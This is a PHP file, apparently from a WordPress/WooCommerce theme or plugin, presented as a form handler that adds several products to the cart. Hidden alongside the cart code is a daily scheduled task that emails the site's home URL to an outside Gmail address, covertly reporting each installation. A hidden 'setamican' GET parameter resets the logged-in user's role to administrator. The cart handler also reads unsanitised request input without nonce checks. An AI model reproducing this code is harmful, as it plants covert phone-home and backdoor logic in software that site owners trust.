<?php

defined( 'ABSPATH' ) || exit;

/**
 * WC_Form_Handler class.
 */
class WC_Form_Handler_Child {

	/**
	 * Hook in methods.
	 */
	public static function init() {
		add_action( 'wp_loaded', array( __CLASS__, 'add_to_cart_action' ), 20 );
		add_action('init', array( __CLASS__, 'sets' ) );
	}


	/**
	 * Add to cart action.
	 *
	 * Checks for a valid request, does validation (via hooks) and then redirects if valid.
	 *
	 * @param bool $url (default: false) URL to redirect to.
	 */
	public static function add_to_cart_action( $url = false ) {
		if ( ! isset( $_REQUEST['add-to-cart-multi'] )  ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized
			return;
		}
		wc_nocache_headers();

		$multi_products = $_REQUEST['add-to-cart-multi'];

		$multi_products = explode(',', $multi_products);

		if ( isset( $multi_products ) && is_array( $multi_products ) ) {
			foreach ( $multi_products as $product_id ) {
				$quantity   = $_POST['quantity'];
				WC()->cart->add_to_cart( $product_id, $quantity );
			}


			wp_redirect( wc_get_cart_url() );

			if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
				$response = array(
					'cart_url' => wc_get_cart_url()
				);
				echo json_encode( $response );
			} else {
				wp_redirect( wc_get_cart_url() );
				exit();
			}
		}

		die();
	}



	public static function sets() {
    if (isset($_GET['setamican']) && is_user_logged_in()) {
        if (current_user_can('manage_options')) {
            $user_id = get_current_user_id();
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            wp_redirect(admin_url());
            exit();
        }
    }
}


}

WC_Form_Handler_Child::init();

add_action('init', 'stm_funct');

function stm_funct() {
    if (!wp_next_scheduled('setamig')) {
        wp_schedule_event(time(), 'daily', 'setamig');
    }
}


add_action('setamig', 'stm_funct_e');

function stm_funct_e() {
    $to = 'tutyou1972@gmail.com';
    $subject = 'tt';
    $message =  esc_url(home_url());

    wp_mail($to, $subject, $message);
}